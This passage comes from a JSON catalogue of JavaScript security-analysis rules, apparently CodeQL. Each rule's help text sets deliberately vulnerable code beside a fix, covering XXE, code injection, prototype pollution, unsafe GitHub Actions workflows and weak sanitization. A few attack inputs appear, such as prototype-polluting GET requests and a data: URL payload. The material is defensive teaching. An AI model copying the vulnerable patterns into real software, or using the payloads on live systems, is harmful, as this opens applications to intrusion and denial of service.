    "help": "# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
  },
  "js/insecure-randomness": {
    "name": "Insecure randomness",
    "description": "Using a cryptographically weak pseudo-random number generator to generate a security-sensitive value may allow an attacker to predict what value will be generated.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "js/insecure-randomness",
    "tags": [
      "security",
      "external/cwe/cwe-338"
    ],
    "filename": "524d82dd-InsecureRandomness",
    "language": "javascript",
    "help": "# Insecure randomness\nUsing a cryptographically weak pseudo-random number generator to generate a security-sensitive value, such as a password, makes it easier for an attacker to predict the value.\n\nPseudo-random number generators generate a sequence of numbers that only approximates the properties of random numbers. The sequence is not truly random because it is completely determined by a relatively small set of initial values, the seed. If the random number generator is cryptographically weak, then this sequence may be easily predictable through outside observations.\n\n\n## Recommendation\nUse a cryptographically secure pseudo-random number generator if the output is to be used in a security-sensitive context. As a rule of thumb, a value should be considered \"security-sensitive\" if predicting it would allow the attacker to perform an action that they would otherwise be unable to perform. For example, if an attacker could predict the random password generated for a new user, they would be able to log in as that new user.\n\nFor JavaScript on the NodeJS platform, `crypto.getRandomBytes` provides a cryptographically secure pseudo-random byte generator. Note that the conversion from bytes to numbers can introduce bias that breaks the security.\n\nFor JavaScript in the browser, `crypto.getRandomValues` provides a cryptographically secure pseudo-random number generator.\n\n\n## Example\nThe following examples show different ways of generating a password.\n\nIn the first case, we generate a fresh password by appending a random integer to the end of a static string. The random number generator used (`Math.random`) is not cryptographically secure, so it may be possible for an attacker to predict the generated password.\n\n\n```javascript\nfunction insecurePassword() {\n    // BAD: the random suffix is not cryptographically secure\n    var suffix = Math.random();\n    var password = \"myPassword\" + suffix;\n    return password;\n}\n\n```\nIn the second example, a cryptographically secure random number generator is used for the same purpose. In this case, it is much harder to predict the generated integers.\n\n\n```javascript\nfunction securePassword() {\n    // GOOD: the random suffix is cryptographically secure\n    var suffix = window.crypto.getRandomValues(new Uint32Array(1))[0];\n    var password = \"myPassword\" + suffix;\n    \n    // GOOD: if a random value between 0 and 1 is desired\n    var secret = window.crypto.getRandomValues(new Uint32Array(1))[0] * Math.pow(2,-32);\n}\n\n```\n\n## References\n* Wikipedia: [Pseudo-random number generator](http://en.wikipedia.org/wiki/Pseudorandom_number_generator).\n* Mozilla Developer Network: [Crypto: getRandomValues()](https://developer.mozilla.org/en-US/docs/Web/API/Crypto/getRandomValues).\n* NodeJS: [crypto.randomBytes](https://nodejs.org/api/crypto.html#crypto_crypto_randombytes_size_callback)\n* Common Weakness Enumeration: [CWE-338](https://cwe.mitre.org/data/definitions/338.html).\n"
  },
  "js/client-side-unvalidated-url-redirection": {
    "name": "Client-side URL redirect",
    "description": "Client-side URL redirection based on unvalidated user input may cause redirection to malicious web sites.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 6.1,
    "precision": "high",
    "id": "js/client-side-unvalidated-url-redirection",
    "tags": [
      "security",
      "external/cwe/cwe-079",
      "external/cwe/cwe-116",
      "external/cwe/cwe-601"
    ],
    "filename": "d7679eb5-ClientSideUrlRedirect",
    "language": "javascript",
    "help": "# Client-side URL redirect\nRedirecting to a URL that is constructed from parts of the DOM that may be controlled by an attacker can facilitate phishing attacks. In these attacks, unsuspecting users can be redirected to a malicious site that looks very similar to the real site they intend to visit, but which is controlled by the attacker.\n\n\n## Recommendation\nTo guard against untrusted URL redirection, it is advisable to avoid putting user input directly into a redirect URL. Instead, maintain a list of authorized redirects on the server; then choose from that list based on the user input provided.\n\n\n## Example\nThe following example uses a regular expression to extract a query parameter from the document URL, and then uses it to construct a new URL to redirect to without any further validation. This may allow an attacker to craft a link that redirects from a trusted website to some arbitrary website of their choosing, which facilitates phishing attacks:\n\n\n```javascript\nwindow.location = /.*redirect=([^&]*).*/.exec(document.location.href)[1];\n\n```\n\n## References\n* OWASP: [ XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n* Common Weakness Enumeration: [CWE-601](https://cwe.mitre.org/data/definitions/601.html).\n"
  },
  "js/xxe": {
    "name": "XML external entity expansion",
    "description": "Parsing user input as an XML document with external entity expansion is vulnerable to XXE attacks.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.1,
    "precision": "high",
    "id": "js/xxe",
    "tags": [
      "security",
      "external/cwe/cwe-611",
      "external/cwe/cwe-827"
    ],
    "filename": "6680271b-Xxe",
    "language": "javascript",
    "help": "# XML external entity expansion\nParsing untrusted XML files with a weakly configured XML parser may lead to an XML External Entity (XXE) attack. This type of attack uses external entity references to access arbitrary files on a system, carry out denial-of-service (DoS) attacks, or server-side request forgery. Even when the result of parsing is not returned to the user, DoS attacks are still possible and out-of-band data retrieval techniques may allow attackers to steal sensitive data.\n\n\n## Recommendation\nThe easiest way to prevent XXE attacks is to disable external entity handling when parsing untrusted data. How this is done depends on the library being used. Note that some libraries, such as recent versions of `libxml`, disable entity expansion by default, so unless you have explicitly enabled entity expansion, no further action needs to be taken.\n\n\n## Example\nThe following example uses the `libxml` XML parser to parse a string `xmlSrc`. If that string is from an untrusted source, this code may be vulnerable to an XXE attack, since the parser is invoked with the `noent` option set to `true`:\n\n\n```javascript\nconst app = require(\"express\")(),\n  libxml = require(\"libxmljs\");\n\napp.post(\"upload\", (req, res) => {\n  let xmlSrc = req.body,\n    doc = libxml.parseXml(xmlSrc, { noent: true });\n});\n\n```\nTo guard against XXE attacks, the `noent` option should be omitted or set to `false`. This means that no entity expansion is undertaken at all, not even for standard internal entities such as `&amp;` or `&gt;`. If desired, these entities can be expanded in a separate step using utility functions provided by libraries such as [underscore](http://underscorejs.org/#unescape), [lodash](https://lodash.com/docs/4.17.15#unescape) or [he](https://github.com/mathiasbynens/he).\n\n\n```javascript\nconst app = require(\"express\")(),\n  libxml = require(\"libxmljs\");\n\napp.post(\"upload\", (req, res) => {\n  let xmlSrc = req.body,\n    doc = libxml.parseXml(xmlSrc);\n});\n\n```\n\n## References\n* OWASP: [XML External Entity (XXE) Processing](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing).\n* Timothy Morgen: [XML Schema, DTD, and Entity Attacks](https://research.nccgroup.com/2014/05/19/xml-schema-dtd-and-entity-attacks-a-compendium-of-known-techniques/).\n* Timur Yunusov, Alexey Osipov: [XML Out-Of-Band Data Retrieval](https://www.slideshare.net/qqlan/bh-ready-v4).\n* Common Weakness Enumeration: [CWE-611](https://cwe.mitre.org/data/definitions/611.html).\n* Common Weakness Enumeration: [CWE-827](https://cwe.mitre.org/data/definitions/827.html).\n"
  },
  "js/code-injection-dynamic-import": {
    "name": "Code injection",
    "description": "Interpreting unsanitized user input as code allows a malicious user arbitrary code execution.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.3,
    "precision": "high",
    "id": "js/code-injection-dynamic-import",
    "tags": [
      "security",
      "external/cwe/cwe-094",
      "external/cwe/cwe-095",
      "external/cwe/cwe-079",
      "external/cwe/cwe-116"
    ],
    "filename": "e3fab245-CodeInjection",
    "language": "javascript",
    "help": "# Code injection\nDirectly evaluating user input (for example, an HTTP request parameter) as code without properly sanitizing the input first allows an attacker arbitrary code execution. This can occur when user input is treated as JavaScript, or passed to a framework which interprets it as an expression to be evaluated. Examples include AngularJS expressions or JQuery selectors.\n\n\n## Recommendation\nAvoid including user input in any expression which may be dynamically evaluated. If user input must be included, use context-specific escaping before including it. It is important that the correct escaping is used for the type of evaluation that will occur.\n\n\n## Example\nThe following example shows part of the page URL being evaluated as JavaScript code on the server. This allows an attacker to provide JavaScript within the URL and send it to server. client side attacks need victim users interaction like clicking on a attacker provided URL.\n\n\n```javascript\nconst { Worker } = require('node:worker_threads');\nvar app = require('express')();\n\napp.post('/path', async function (req, res) {\n    const payload = req.query.queryParameter // like:  payload = 'data:text/javascript,console.log(\"hello!\");//'\n    const payloadURL = new URL(payload)\n    new Worker(payloadURL);\n});\n\napp.post('/path2', async function (req, res) {\n    const payload = req.query.queryParameter // like:  payload = 'data:text/javascript,console.log(\"hello!\");//'\n    await import(payload)\n});\n\n\n```\n\n## References\n* OWASP: [Code Injection](https://www.owasp.org/index.php/Code_Injection).\n* Wikipedia: [Code Injection](https://en.wikipedia.org/wiki/Code_injection).\n* PortSwigger Research Blog: [Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n* Common Weakness Enumeration: [CWE-95](https://cwe.mitre.org/data/definitions/95.html).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "js/actions/actions-artifact-leak": {
    "name": "Storage of sensitive information in GitHub Actions artifact",
    "description": "Including sensitive information in a GitHub Actions artifact can expose it to an attacker.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "js/actions/actions-artifact-leak",
    "tags": [
      "security",
      "external/cwe/cwe-312",
      "external/cwe/cwe-315",
      "external/cwe/cwe-359"
    ],
    "filename": "1b3d24d7-ActionsArtifactLeak",
    "language": "javascript",
    "help": "# Storage of sensitive information in GitHub Actions artifact\nSensitive information included in a GitHub Actions artifact can allow an attacker to access the sensitive information if the artifact is published.\n\n\n## Recommendation\nOnly store information that is meant to be publicly available in a GitHub Actions artifact.\n\n\n## Example\nThe following example uses `actions/checkout` to checkout code which stores the GITHUB_TOKEN in the \\`.git/config\\` file and then stores the contents of the \\`.git\\` repository into the artifact:\n\n\n```yaml\nname: secrets-in-artifacts\non:\n  pull_request:\njobs:\n  a-job: # VULNERABLE\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: \"Upload artifact\"\n        uses: actions/upload-artifact@1746f4ab65b179e0ea60a494b83293b640dd5bba # v4.3.2\n        with:\n          name: file\n          path: .\n\n```\nThe issue has been fixed below, where the `actions/upload-artifact` uses a version (v4+) which does not include hidden files or directories into the artifact.\n\n\n```yaml\nname: secrets-in-artifacts\non:\n  pull_request:\njobs:\n  a-job: # NOT VULNERABLE\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: \"Upload artifact\"\n        uses: actions/upload-artifact@v4\n        with:\n          name: file\n          path: .\n\n\n```\n"
  },
  "js/prototype-pollution": {
    "name": "Prototype-polluting merge call",
    "description": "Recursively merging a user-controlled object into another object can allow an attacker to modify the built-in Object prototype, and possibly escalate to remote code execution or cross-site scripting.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 6.1,
    "precision": "high",
    "id": "js/prototype-pollution",
    "tags": [
      "security",
      "external/cwe/cwe-078",
      "external/cwe/cwe-079",
      "external/cwe/cwe-094",
      "external/cwe/cwe-400",
      "external/cwe/cwe-471",
      "external/cwe/cwe-915"
    ],
    "filename": "cffa8a05-PrototypePollutingMergeCall",
    "language": "javascript",
    "help": "# Prototype-polluting merge call\nMost JavaScript objects inherit the properties of the built-in `Object.prototype` object. Prototype pollution is a type of vulnerability in which an attacker is able to modify `Object.prototype`. Since most objects inherit from the compromised `Object.prototype`, the attacker can use this to tamper with the application logic, and often escalate to remote code execution or cross-site scripting.\n\nOne way to cause prototype pollution is through use of an unsafe *merge* or *extend* function to recursively copy properties from an untrusted source object. Such a call can modify any object reachable from the destination object, and the built-in `Object.prototype` is usually reachable through the special properties `__proto__` and `constructor.prototype`. An attacker can abuse this by sending an object with these property names and thereby modify `Object.prototype`.\n\n\n## Recommendation\nUpdate your library dependencies in order to use a safe version of the *merge* or *extend* function. If your library has no fixed version, switch to another library.\n\n\n## Example\nIn the example below, the untrusted value `req.query.prefs` is parsed as JSON and then copied into a new object:\n\n\n```javascript\napp.get('/news', (req, res) => {\n  let prefs = lodash.merge({}, JSON.parse(req.query.prefs));\n})\n\n```\nPrior to lodash 4.17.11 this would be vulnerable to prototype pollution. An attacker could send the following GET request:\n\n```\nGET /news?prefs={\"constructor\":{\"prototype\":{\"xxx\":true}}}\n```\nThis causes the `xxx` property to be injected on `Object.prototype`. Fix this by updating the lodash version:\n\n\n```json\n{\n  \"dependencies\": {\n    \"lodash\": \"^4.17.12\"\n  }\n}\n\n```\nNote that some web frameworks, such as Express, parse query parameters using extended URL-encoding by default. When this is the case, the application may be vulnerable even if not using `JSON.parse`. The example below would also be susceptible to prototype pollution:\n\n\n```javascript\napp.get('/news', (req, res) => {\n  let config = lodash.merge({}, {\n    prefs: req.query.prefs\n  });\n})\n\n```\nIn the above example, an attacker can cause prototype pollution by sending the following GET request:\n\n```\nGET /news?prefs[constructor][prototype][xxx]=true\n```\n\n## References\n* Prototype pollution attacks: [lodash](https://hackerone.com/reports/380873), [jQuery](https://hackerone.com/reports/454365), [extend](https://hackerone.com/reports/381185), [just-extend](https://hackerone.com/reports/430291), [merge.recursive](https://hackerone.com/reports/381194).\n* Express: [urlencoded()](https://expressjs.com/en/api.html#express.urlencoded)\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n* Common Weakness Enumeration: [CWE-471](https://cwe.mitre.org/data/definitions/471.html).\n* Common Weakness Enumeration: [CWE-915](https://cwe.mitre.org/data/definitions/915.html).\n"
  },
  "js/actions/pull-request-target": {
    "name": "Checkout of untrusted code in trusted context",
    "description": "Workflows triggered on `pull_request_target` have read/write access to the base repository and access to secrets. By explicitly checking out and running the build script from a fork the untrusted code is running in an environment that is able to push to the base repository and to access secrets.",
    "kind": "problem",
    "problem.severity": "warning",
    "precision": "low",
    "id": "js/actions/pull-request-target",
    "tags": [
      "actions",
      "security",
      "experimental",
      "external/cwe/cwe-094"
    ],
    "filename": "96a79feb-UntrustedCheckout",
    "language": "javascript",
    "help": "# Checkout of untrusted code in trusted context\nCombining *pull_request_target* workflow trigger with an explicit checkout of an untrusted pull request is a dangerous practice that may lead to repository compromise.\n\n\n## Recommendation\nThe best practice is to handle the potentially untrusted pull request via the *pull_request* trigger so that it is isolated in an unprivileged environment. The workflow processing the pull request should then store any results like code coverage or failed/passed tests in artifacts and exit. The following workflow then starts on *workflow_run* where it is granted write permission to the target repository and access to repository secrets, so that it can download the artifacts and make any necessary modifications to the repository or interact with third party services that require repository secrets (e.g. API tokens).\n\n\n## Example\nThe following example allows unauthorized repository modification and secrets exfiltration:\n\n\n```yaml\non:\n  pull_request_target\n\njobs:\n  build:\n    name: Build and test\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v2\n      with:\n        ref: ${{ github.event.pull_request.head.sha }}\n\n    - uses: actions/setup-node@v1\n    - run: |\n        npm install\n        npm build\n\n    - uses: completely/fakeaction@v2\n      with:\n        arg1: ${{ secrets.supersecret }}\n\n    - uses: fakerepo/comment-on-pr@v1\n      with:\n        message: |\n          Thank you!\n```\nThe following example uses two workflows to handle potentially untrusted pull request in a secure manner. The receive_pr.yml is triggered first:\n\n\n```yaml\nname: Receive PR\n\n# read-only repo token\n# no access to secrets\non:\n  pull_request:\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:        \n      - uses: actions/checkout@v2\n\n      # imitation of a build process\n      - name: Build\n        run: /bin/bash ./build.sh\n\n      - name: Save PR number\n        run: |\n          mkdir -p ./pr\n          echo ${{ github.event.number }} > ./pr/NR\n      - uses: actions/upload-artifact@v2\n        with:\n          name: pr\n          path: pr/\n```\nThe comment_pr.yml is triggered after receive_pr.yml completes:\n\n\n```yaml\nname: Comment on the pull request\n\n# read-write repo token\n# access to secrets\non:\n  workflow_run:\n    workflows: [\"Receive PR\"]\n    types:\n      - completed\n\njobs:\n  upload:\n    runs-on: ubuntu-latest\n    if: >\n      ${{ github.event.workflow_run.event == 'pull_request' &&\n      github.event.workflow_run.conclusion == 'success' }}\n    steps:\n      - name: 'Download artifact'\n        uses: actions/github-script@v3.1.0\n        with:\n          script: |\n            var artifacts = await github.actions.listWorkflowRunArtifacts({\n               owner: context.repo.owner,\n               repo: context.repo.repo,\n               run_id: ${{github.event.workflow_run.id }},\n            });\n            var matchArtifact = artifacts.data.artifacts.filter((artifact) => {\n              return artifact.name == \"pr\"\n            })[0];\n            var download = await github.actions.downloadArtifact({\n               owner: context.repo.owner,\n               repo: context.repo.repo,\n               artifact_id: matchArtifact.id,\n               archive_format: 'zip',\n            });\n            var fs = require('fs');\n            fs.writeFileSync('${{github.workspace}}/pr.zip', Buffer.from(download.data));\n      - run: unzip pr.zip\n\n      - name: 'Comment on PR'\n        uses: actions/github-script@v3\n        with:\n          github-token: ${{ secrets.GITHUB_TOKEN }}\n          script: |\n            var fs = require('fs');\n            var issue_number = Number(fs.readFileSync('./NR'));\n            await github.issues.createComment({\n              owner: context.repo.owner,\n              repo: context.repo.repo,\n              issue_number: issue_number,\n              body: 'Everything is OK. Thank you for the PR!'\n            });\n```\n\n## References\n* GitHub Security Lab Research: [Keeping your GitHub Actions and workflows secure: Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n"
  },
  "js/unnecessary-use-of-cat": {
    "name": "Unnecessary use of `cat` process",
    "description": "Using the  `cat` process to read a file is unnecessarily complex, inefficient, unportable, and can lead to subtle bugs, or even security vulnerabilities.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 6.3,
    "precision": "high",
    "id": "js/unnecessary-use-of-cat",
    "tags": [
      "correctness",
      "security",
      "maintainability",
      "external/cwe/cwe-078"
    ],
    "filename": "5ab6110a-UselessUseOfCat",
    "language": "javascript",
    "help": "# Unnecessary use of `cat` process\nUsing the unix command `cat` only to read a file is an unnecessarily complex way to achieve something that can be done in a simpler and safer manner using the Node.js `fs.readFile` API.\n\nThe use of `cat` for simple file reads leads to code that is unportable, inefficient, complex, and can lead to subtle bugs or even security vulnerabilities.\n\n\n## Recommendation\nUse `fs.readFile` or `fs.readFileSync` to read files from the file system.\n\n\n## Example\nThe following example shows code that reads a file using `cat`:\n\n\n```javascript\nvar child_process = require('child_process');\n\nmodule.exports = function (name) {\n    return child_process.execSync(\"cat \" + name).toString();\n};\n\n```\nThe code in the example will break if the input `name` contains special characters (including space). Additionally, it does not work on Windows and if the input is user-controlled, a command injection attack can happen.\n\nThe `fs.readFile` API should be used to avoid these potential issues:\n\n\n```javascript\nvar fs = require('fs');\n\nmodule.exports = function (name) {\n    return fs.readFileSync(name).toString();\n};\n\n```\n\n## References\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* Node.js: [File System API](https://nodejs.org/api/fs.html).\n* [The Useless Use of Cat Award](http://porkmail.org/era/unix/award.html#cat).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n"
  },
  "js/different-kinds-comparison-bypass": {
    "name": "Comparison of user-controlled data of different kinds",
    "description": "Comparing different kinds of HTTP request data may be a symptom of an insufficient security check.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "low",
    "id": "js/different-kinds-comparison-bypass",
    "tags": [
      "security",
      "external/cwe/cwe-807",
      "external/cwe/cwe-290"
    ],
    "filename": "8edfff20-DifferentKindsComparisonBypass",
    "language": "javascript",
    "help": "# Comparison of user-controlled data of different kinds\nMany programmers mistakenly believe that information stored in cookies and hidden HTML form fields is tamper-proof and cannot be changed by the user. Hence they might try to verify other request data by comparing it against this information, for example by checking whether a user name embedded in a request parameter matches data stored in an (unsigned) cookie. In fact, however, all of these sources of data are user-controlled, so a malicious user can easily bypass such checks to gain unauthorized access to protected functionality or data.\n\n\n## Recommendation\nWhen checking whether a user is authorized for a particular activity, do not use data that is entirely controlled by that user in the permissions check. If necessary, always validate the input, ideally against a fixed list of expected values.\n\nSimilarly, do not decide which permission to check for, based on user data. In particular, avoid using computation to decide which permissions to check for. Use fixed permissions for particular actions, rather than generating the permission to check for.\n\n\n## Example\nIn this example, we have a server that shows private information for a user, based on the request parameter `userId`. For privacy reasons, users may only view their own private information, so the server checks that the request parameter `userId` matches a cookie value for the user who is logged in.\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.cookies.loggedInUserId !== req.params.userId) {\n        // BAD: login decision made based on user controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\nThis security check is, however, insufficient since an attacker can craft their cookie values to match those of any user. To prevent this, the server can cryptographically sign the security critical cookie values:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.signedCookies.loggedInUserId !== req.params.userId) {\n        // GOOD: login decision made based on server controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-807](https://cwe.mitre.org/data/definitions/807.html).\n* Common Weakness Enumeration: [CWE-290](https://cwe.mitre.org/data/definitions/290.html).\n"
  },
  "js/loop-bound-injection": {
    "name": "Loop bound injection",
    "description": "Iterating over an object with a user-controlled .length property can cause indefinite looping.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "id": "js/loop-bound-injection",
    "tags": [
      "security",
      "external/cwe/cwe-834",
      "external/cwe/cwe-730"
    ],
    "precision": "high",
    "filename": "87cbda9a-LoopBoundInjection",
    "language": "javascript",
    "help": "# Loop bound injection\nUsing the `.length` property of an untrusted object as a loop bound may cause indefinite looping since a malicious attacker can set the `.length` property to a very large number. For example, when a program that expects an array is passed a JSON object such as `{length: 1e100}`, the loop will be run for 10<sup>100</sup> iterations. This may cause the program to hang or run out of memory, which can be used to mount a denial-of-service (DoS) attack.\n\n\n## Recommendation\nEither check that the object is indeed an array or limit the size of the `.length` property.\n\n\n## Example\nIn the example below, an HTTP request handler iterates over a user-controlled object `obj` using the `obj.length` property in order to copy the elements from `obj` to an array.\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.post(\"/foo\", (req, res) => {\n    var obj = req.body;\n\n    var ret = [];\n\n    // Potential DoS if obj.length is large.\n    for (var i = 0; i < obj.length; i++) {\n        ret.push(obj[i]);\n    }\n});\n\n```\nThis is not secure since an attacker can control the value of `obj.length`, and thereby cause the loop to iterate indefinitely. Here the potential DoS is fixed by enforcing that the user-controlled object is an array.\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.post(\"/foo\", (req, res) => {\n    var obj = req.body;\n    \n    if (!(obj instanceof Array)) { // Prevents DoS.\n        return [];\n    }\n\n    var ret = [];\n\n    for (var i = 0; i < obj.length; i++) {\n        ret.push(obj[i]);\n    }\n});\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-834](https://cwe.mitre.org/data/definitions/834.html).\n* Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n"
  },
  "js/incomplete-sanitization": {
    "name": "Incomplete string escaping or encoding",
    "description": "A string transformer that does not replace or escape all occurrences of a meta-character may be ineffective.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "js/incomplete-sanitization",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-020",
      "external/cwe/cwe-080",
      "external/cwe/cwe-116"
    ],
    "filename": "557f3ed7-IncompleteSanitization",
    "language": "javascript",
    "help": "# Incomplete string escaping or encoding\nSanitizing untrusted input is a common technique for preventing injection attacks such as SQL injection or cross-site scripting. Usually, this is done by escaping meta-characters such as quotes in a domain-specific way so that they are treated as normal characters.\n\nHowever, directly using the string `replace` method to perform escaping is notoriously error-prone. Common mistakes include only replacing the first occurrence of a meta-character, or backslash-escaping various meta-characters but not the backslash itself.\n\nIn the former case, later meta-characters are left undisturbed and can be used to subvert the sanitization. In the latter case, preceding a meta-character with a backslash leads to the backslash being escaped, but the meta-character appearing un-escaped, which again makes the sanitization ineffective.\n\nEven if the escaped string is not used in a security-critical context, incomplete escaping may still have undesirable effects, such as badly rendered or confusing output.\n\n\n## Recommendation\nUse a (well-tested) sanitization library if at all possible. These libraries are much more likely to handle corner cases correctly than a custom implementation.\n\nAn even safer alternative is to design the application so that sanitization is not needed, for instance by using prepared statements for SQL queries.\n\nOtherwise, make sure to use a regular expression with the `g` flag to ensure that all occurrences are replaced, and remember to escape backslashes if applicable.\n\n\n## Example\nFor example, assume that we want to embed a user-controlled string `accountNumber` into a SQL query as part of a string literal. To avoid SQL injection, we need to ensure that the string does not contain un-escaped single-quote characters. The following function attempts to ensure this by doubling single quotes, and thereby escaping them:\n\n\n```javascript\nfunction escapeQuotes(s) {\n  return s.replace(\"'\", \"''\");\n}\n\n```\nAs written, this sanitizer is ineffective: if the first argument to `replace` is a string literal (as in this case), only the *first* occurrence of that string is replaced.\n\nAs mentioned above, the function `escapeQuotes` should be replaced with a purpose-built sanitization library, such as the npm module `sqlstring`. Many other sanitization libraries are available from npm and other sources.\n\nIf this is not an option, `escapeQuotes` should be rewritten to use a regular expression with the `g` (\"global\") flag instead:\n\n\n```javascript\nfunction escapeQuotes(s) {\n  return s.replace(/'/g, \"''\");\n}\n\n```\nNote that it is very important to include the global flag: `s.replace(/'/, \"''\")` *without* the global flag is equivalent to the first example above and only replaces the first quote.\n\n\n## References\n* OWASP Top 10: [A1 Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection).\n* npm: [sqlstring](https://www.npmjs.com/package/sqlstring) package.\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n* Common Weakness Enumeration: [CWE-80](https://cwe.mitre.org/data/definitions/80.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "js/incomplete-multi-character-sanitization": {
    "name": "Incomplete multi-character sanitization",
    "description": "A sanitizer that removes a sequence of characters may reintroduce the dangerous sequence.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "js/incomplete-multi-character-sanitization",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-020",
      "external/cwe/cwe-080",
      "external/cwe/cwe-116"
    ],
    "filename": "557f3ed7-IncompleteMultiCharacterSanitization",
    "language": "javascript",
    "help": "# Incomplete multi-character sanitization\nSanitizing untrusted input is a common technique for preventing injection attacks and other security vulnerabilities. Regular expressions are often used to perform this sanitization. However, when the regular expression matches multiple consecutive characters, replacing it just once can result in the unsafe text reappearing in the sanitized input.\n\nAttackers can exploit this issue by crafting inputs that, when sanitized with an ineffective regular expression, still contain malicious code or content. This can lead to code execution, data exposure, or other vulnerabilities.\n\n\n## Recommendation\nTo prevent this issue, it is highly recommended to use a well-tested sanitization library whenever possible. These libraries are more likely to handle corner cases and ensure effective sanitization.\n\nIf a library is not an option, you can consider alternative strategies to fix the issue. For example, applying the regular expression replacement repeatedly until no more replacements can be performed, or rewriting the regular expression to match single characters instead of the entire unsafe text.\n\n\n## Example\nConsider the following JavaScript code that aims to remove all HTML comment start and end tags:\n\n```javascript\n\nstr.replace(/<!--|--!?>/g, \"\");   \n\n```\nGiven the input string \"&lt;!&lt;!--- comment ---&gt;&gt;\", the output will be \"&lt;!-- comment --&gt;\", which still contains an HTML comment.\n\nOne possible fix for this issue is to apply the regular expression replacement repeatedly until no more replacements can be performed. This ensures that the unsafe text does not re-appear in the sanitized input, effectively removing all instances of the targeted pattern:\n\n```javascript\n\nfunction removeHtmlComments(input) {  \n  let previous;  \n  do {  \n    previous = input;  \n    input = input.replace(/<!--|--!?>/g, \"\");  \n  } while (input !== previous);  \n  return input;  \n}  \n\n```\n\n## Example\nAnother example is the following regular expression intended to remove script 